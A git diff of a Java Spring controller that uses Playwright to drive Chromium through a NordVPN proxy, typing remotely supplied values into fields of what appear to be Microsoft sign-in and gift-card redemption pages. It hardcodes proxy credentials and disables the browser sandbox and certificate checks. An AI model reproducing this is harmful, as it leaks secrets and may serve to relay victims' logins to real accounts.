@@ -3,6 +3,7 @@ package com.playwrite.controller;
 
 import com.microsoft.playwright.*;
 import com.microsoft.playwright.options.LoadState;
+import com.microsoft.playwright.options.Proxy;
 import com.playwrite.Field;
 import com.playwrite.HtmlUtil;
 import jakarta.servlet.http.HttpServletRequest;
@@ -21,7 +22,9 @@ import org.springframework.web.bind.annotation.*;
 
 import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.util.Arrays;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
 //import com.jayway.jsonpath.JsonPath;
 
 @RestController
@@ -73,9 +76,19 @@ public class RemoteRestController {
         //innerFrame.get(0).waitForLoadState();
         Frame innerFrame  =  innerFrames.get(0);
         innerFrame.locator(field.getXpath()).clear();
-        innerFrame.locator(field.getXpath()).type(field.getValue());
-        String value = innerFrame.locator(field.getXpath()).inputValue();
-        return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \""+ value + "\" }", HttpStatus.OK);
+        try {
+            innerFrame.locator(field.getXpath()).type(field.getValue());
+            TimeUnit.SECONDS.sleep(1);
+
+            String value = innerFrame.locator(field.getXpath()).inputValue();
+            System.out.println("value:" + value);
+            return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \"" + value + "\" }", HttpStatus.OK);
+        }catch (com.microsoft.playwright.PlaywrightException pe){
+            return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \"\" }", HttpStatus.OK);
+
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        }
     }
 
 
@@ -114,7 +127,7 @@ public class RemoteRestController {
         String[] args = //{"Hello", "World"};
                 {
                         //'--proxy-server=200.32.51.179:8080',
-                        //'--proxy-server=131.221.64.62:8090',
+                        "--proxy-server=https://ar51.nordvpn.com:89",
                         "--ignore-certificate-errors",
                         "--no-sandbox",
                         //'--disable-setuid-sandbox',
@@ -128,11 +141,21 @@ public class RemoteRestController {
 
         if (page == null) {
             System.out.println(page);
-            Browser browser = playwright.chromium().launch(new BrowserType.LaunchOptions().setHeadless(false)
-                    //     .setArgs(Arrays.asList(args))
-            );
+
+            Browser browser = playwright.chromium().launch(
+                    new BrowserType.LaunchOptions().setHeadless(false)
+                   .setArgs(Arrays.asList(args)).setProxy(new Proxy("https://ar51.nordvpn.com:89")
+                    .setUsername("vbTk73o2jxFYVXwvgrmL3JCH")
+                    .setPassword("qzEM4CgVayuU5v8LCWjKqknt")));
+
+
+
+
             BrowserContext context = browser.newContext();
             page = context.newPage();
+
+
+
             // page.setDefaultTimeout(100000);
         }
         //page.navigate("https://redeem.microsoft.com");
@@ -197,7 +220,27 @@ public class RemoteRestController {
             //return new ResponseEntity<String>(content, HttpStatus.TEMPORARY_REDIRECT);
             response.sendRedirect("/");
         }
-        System.out.println("page.title(): " + page.title());
+
+        try {
+            System.out.println("page.title(): " + page.title());
+
+        } catch (Exception e){
+            int pos = request.getRequestURL().indexOf(request.getRequestURI());
+
+            String homeScript = request.getRequestURL().substring(0, pos);
+            String scriptUrl = homeScript + "/script/custom.js";
+
+
+            String body = "<html lang=\"he-IL\">\n" +
+                    " <head>\n" +
+                    "  <title>error</title>\n" +
+                    "<script src='" + scriptUrl + "'></script>" +
+                    " </head>\n" +
+                    " <body></body>";
+
+
+            return new ResponseEntity<String>(body, HttpStatus.OK);
+        }
         //Sign in to your Microsoft account
         //Microsoft account(
         if (!(page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")
